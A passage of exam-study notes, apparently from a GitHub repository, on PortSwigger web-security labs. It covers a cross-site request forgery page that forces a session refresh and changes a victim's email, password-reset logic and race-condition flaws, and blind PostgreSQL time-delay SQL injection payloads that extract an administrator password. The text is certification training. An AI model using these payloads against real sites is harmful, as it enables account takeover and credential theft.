\"https://cms-TARGET.net/login?username=ENCODED-POC-CSWSH-SCRIPT\u0026amp;password=Peanut2019\";\n\u0026lt;/script\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThe chat history contain password for the victim.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/chat-history.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/chat-history.png\" alt=\"chat-history.png\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain\" rel=\"nofollow\"\u003ePortSwigger Lab: SameSite Strict bypass via sibling domain\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eSameSite Lax bypass\u003c/h3\u003e\u003ca id=\"user-content-samesite-lax-bypass\" class=\"anchor\" aria-label=\"Permalink: SameSite Lax bypass\" href=\"#samesite-lax-bypass\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eObserve if you visit \u003ccode\u003e/social-login\u003c/code\u003e, this automatically initiates the full OAuth flow. If you still have a logged-in session with the OAuth server, this all happens without any interaction., and in proxy history, notice that every time you complete the OAuth flow, the target site sets a new session cookie even if you were already logged in.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eBypass the popup blocker, to induce the victim to click on the page and only opens the popup once the victim has clicked, with the following JavaScript. The exploit JavaScript code first refreshes the victim's session by forcing their browser to visit \u003ccode\u003e/social-login\u003c/code\u003e, then submits the email change request after a short pause. Deliver the exploit to the victim.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"\u0026lt;form method=\u0026quot;POST\u0026quot; action=\u0026quot;https://TARGET.net/my-account/change-email\u0026quot;\u0026gt;\n    \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;email\u0026quot; value=\u0026quot;administrator@exploit-server.net\u0026quot;\u0026gt;\n\u0026lt;/form\u0026gt;\n\u0026lt;p\u0026gt;Click anywhere on the page\u0026lt;/p\u0026gt;\n\u0026lt;script\u0026gt;\n    window.onclick = () =\u0026gt; {\n        window.open('https://TARGET.net/social-login');\n        setTimeout(changeEmail, 5000);\n    }\n\n    function changeEmail() {\n        document.forms[0].submit();\n    }\n\u0026lt;/script\u0026gt;\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e\u0026lt;form method=\"POST\" action=\"https://TARGET.net/my-account/change-email\"\u0026gt;\n    \u0026lt;input type=\"hidden\" name=\"email\" value=\"administrator@exploit-server.net\"\u0026gt;\n\u0026lt;/form\u0026gt;\n\u0026lt;p\u0026gt;Click anywhere on the page\u0026lt;/p\u0026gt;\n\u0026lt;script\u0026gt;\n    window.onclick = () =\u0026gt; {\n        window.open('https://TARGET.net/social-login');\n        setTimeout(changeEmail, 5000);\n    }\n\n    function changeEmail() {\n        document.forms[0].submit();\n    }\n\u0026lt;/script\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh\" rel=\"nofollow\"\u003ePortSwigger Lab: SameSite Lax bypass via cookie refresh\u003c/a\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003ePassword Reset\u003c/h2\u003e\u003ca id=\"user-content-password-reset\" class=\"anchor\" aria-label=\"Permalink: Password Reset\" href=\"#password-reset\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"#refresh-password-broken-logic\"\u003eRefresh Password broken logic\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#current-password\"\u003eCurrent Password\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#time-sensitive-password-tokenz\"\u003eTime-Sensitive Password Tokenz\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eRefresh Password broken logic\u003c/h3\u003e\u003ca id=\"user-content-refresh-password-broken-logic\" class=\"anchor\" aria-label=\"Permalink: Refresh Password broken logic\" href=\"#refresh-password-broken-logic\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eIf the application \u003ca href=\"#subtly-invalid-login\"\u003eRefresh Password\u003c/a\u003e feature is flawed, this vulnerability can be exploited to identify valid accounts or obtain password reset token. This can lead to identifying valid users accounts or privilege escalation.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThis is the type of vulnerability that do not require active user on application to interact with the exploit, and without any user clicking on link or interaction. Take note of vulnerabilities that do not require active user on application for the BSCP exam, as this mean in the next stage of the exam it is possible to use for example \u003ca href=\"#cors\"\u003eother\u003c/a\u003e interactive phishing links send to victim.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cem\u003e\u003cstrong\u003eIdentify\u003c/strong\u003e\u003c/em\u003e in the \u003ccode\u003esource code\u003c/code\u003e for the \u003ccode\u003e/forgot-password\u003c/code\u003e page the username is a hidden field.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/passwoed-reset-hidden-username.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/passwoed-reset-hidden-username.png\" alt=\"Password reset hidden username\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eExploit the post request by deleting the \u003ccode\u003etemp-forgot-password-token\u003c/code\u003e parameter in both the URL and request body. Change the username parameter to \u003ccode\u003ecarlos\u003c/code\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/temp-forgot-password-token.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/temp-forgot-password-token.png\" alt=\"Temp-forgot-password-token\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic\" rel=\"nofollow\"\u003ePortSwigger Lab: Password reset broken logic\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eCurrent Password\u003c/h3\u003e\u003ca id=\"user-content-current-password\" class=\"anchor\" aria-label=\"Permalink: Current Password\" href=\"#current-password\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cem\u003e\u003cstrong\u003eIdentify\u003c/strong\u003e\u003c/em\u003e the Change password do not need the \u003ccode\u003ecurrent-password\u003c/code\u003e parameter to set a new password, and the \u003cstrong\u003euser\u003c/strong\u003e whom password will be changed is based on POST parameter \u003ccode\u003eusername=administrator\u003c/code\u003e\u003cbr\u003e\nIn the PortSwigger labs they provide you the credentials for \u003ccode\u003ewiener:peter\u003c/code\u003e, and this simulate in the exam stage 1 achieved low level user access. In exam this password reset vulnerability is example of how it is possible without \u003cstrong\u003einteraction\u003c/strong\u003e from active user to privilege escalate your access to admin.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eIntercept the \u003ccode\u003e/my-account/change-password\u003c/code\u003e request as the \u003ccode\u003ecsrf\u003c/code\u003e token is single random use value, set \u003ccode\u003eusername=administrator\u003c/code\u003e, and remove \u003ccode\u003ecurrent-password\u003c/code\u003e parameter.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/change-password-without-current.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/change-password-without-current.png\" alt=\"Change password without current\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-weak-isolation-on-dual-use-endpoint\" rel=\"nofollow\"\u003ePortSwigger Lab: Weak isolation on dual-use endpoint\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eTime-Sensitive Password Tokenz\u003c/h3\u003e\u003ca id=\"user-content-time-sensitive-password-tokenz\" class=\"anchor\" aria-label=\"Permalink: Time-Sensitive Password Tokenz\" href=\"#time-sensitive-password-tokenz\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThe target site uses time stamps to generate a hash password reset token URL.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eBy sending parallel force password reset requests for two different users at the same time,\u003cbr\u003e\nwill result in duplicate matching tokens because the same timestamp used by backend to generate the reset tokenz.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eOur own user \u003ccode\u003ecarlos\u003c/code\u003e receive the reset token url in their email and then edit the name in the url to match \u003ccode\u003eadministrator\u003c/code\u003e target victim user.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/portswigger_race_condition_force-forgot-password-tokenz.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/portswigger_race_condition_force-forgot-password-tokenz.png\" alt=\"portswigger_race_condition_force-forgot-password-tokenz.png\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities\" rel=\"nofollow\"\u003ePortSwigger Lab: Exploiting time-sensitive vulnerabilities\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://github.com/botesjuan/API-Web-Security/blob/main/module/race-condition.md#time-sensitive-tokenz\"\u003eReference: API University and PortSwigger Labs study notes\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003chr\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eSQL Injection\u003c/h2\u003e\u003ca id=\"user-content-sql-injection\" class=\"anchor\" aria-label=\"Permalink: SQL Injection\" href=\"#sql-injection\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"#blind-time-delay\"\u003eBlind Time Delay\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#blind-sqli\"\u003eBlind SQLi\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#blind-sqli-no-indication\"\u003eBlind SQLi no indication\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#blind-sqli-conditional-response\"\u003eBlind SQLi Conditional Response\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#oracle\"\u003eOracle\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#sqlmap\"\u003eSQLMAP\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#non-oracle-manual-sqli\"\u003eNon-Oracle Manual SQLi\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#visual-error-based-sqli\"\u003eVisual error-based SQLi\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"https://github.com/botesjuan/cpts-quick-references/blob/main/module/SQL%20Injection%20Fundamentals.md\"\u003eHackTheBox CPTS SQLi Fundamentals\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eError based or Blind SQL injection vulnerabilities, allow SQL queries in an application to be used to extract data or login credentials from the  database. SQLMAP is used to fast track the exploit and retrieve the sensitive information.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cem\u003e\u003cstrong\u003eIdentify\u003c/strong\u003e\u003c/em\u003e SQLi, by adding a double (\") or single quote (') to web parameters or tracking cookies, if this break the SQL syntax resulting in error message response, then positive SQL injection \u003cem\u003e\u003cstrong\u003eidentified\u003c/strong\u003e\u003c/em\u003e. If no error or conditional message observed test blind \u003ca href=\"https://portswigger.net/web-security/sql-injection/cheat-sheet\" rel=\"nofollow\"\u003eTime delays\u003c/a\u003e payloads.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/sql-injection/cheat-sheet\" rel=\"nofollow\"\u003eSQL Injection cheat sheet examples\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/identify-sqli-parameter.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/identify-sqli-parameter.png\" alt=\"Identify the input parameter vulnerable to SQL injection\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eBlind Time Delay\u003c/h3\u003e\u003ca id=\"user-content-blind-time-delay\" class=\"anchor\" aria-label=\"Permalink: Blind Time Delay\" href=\"#blind-time-delay\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eBlind SQL injection with time delays is tricky to \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e, fuzzing involves educated guessing as OffSec also taught me in OSCP. The below payload will perform conditional case to delay the response by 10 seconds if positive SQL injection \u003cem\u003e\u003cstrong\u003eidentified\u003c/strong\u003e\u003c/em\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eIdentify SQLi vulnerability. In \u003ca href=\"https://portswigger.net/web-security/certification/takepracticeexam/index.html\" rel=\"nofollow\"\u003eBurp Practice exam Stage 2\u003c/a\u003e the advance search filters are vulnerable to \u003ccode\u003ePostgreSQL\u003c/code\u003e. I found \u003ccode\u003eSQLMAP\u003c/code\u003e tricky to identify and exploit the practice exam vulnerability in advance search. Manual exploit of the SQL injection time delay in \u003ca href=\"#practice-exam-postgresql-timedelay\"\u003ePractice Exam here\u003c/a\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-sql notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\";SELECT CASE WHEN (1=1) THEN pg_sleep(7) ELSE pg_sleep(0) END--\"\u003e\u003cpre\u003e;\u003cspan class=\"pl-k\"\u003eSELECT\u003c/span\u003e CASE WHEN (\u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e) THEN pg_sleep(\u003cspan class=\"pl-c1\"\u003e7\u003c/span\u003e) ELSE pg_sleep(\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e) END\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://www.urlencoder.org/\" rel=\"nofollow\"\u003eURL encoded\u003c/a\u003e \u003ccode\u003ePostgreSQL\u003c/code\u003e payload.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-sql notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(7)+ELSE+pg_sleep(0)+END--\"\u003e\u003cpre\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(7)+ELSE+pg_sleep(0)+END--\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eDetermine how many characters are in the password of the administrator user. To do this, increment the number after \u003ccode\u003e\u0026gt;1\u003c/code\u003e conditional check.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-sql notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\";SELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)\u0026gt;1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--\"\u003e\u003cpre\u003e;\u003cspan class=\"pl-k\"\u003eSELECT\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003eCASE\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003eWHEN\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e(username\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eadministrator\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-k\"\u003eAND\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003eLENGTH(password)\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e)\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003eTHEN\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003epg_sleep(\u003cspan class=\"pl-c1\"\u003e10\u003c/span\u003e)\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003eELSE\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003epg_sleep(\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e)\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003eEND\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-k\"\u003eFROM\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003eusers\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003e\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/blind-time-delay.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/blind-time-delay.png\" alt=\"blind-time-delay SQLi\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eUsing CLUSTER Bomb attack to re-run the attack for each permutation of the character positions in the password, and to determine character value.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-sql notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\";SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--\"\u003e\u003cpre\u003e;\u003cspan class=\"pl-k\"\u003eSELECT\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003eCASE\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003eWHEN\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e(username\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eadministrator\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-k\"\u003eAND\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003eSUBSTRING\u003c/span\u003e(password,\u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e,\u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e)\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003ea\u003cspan 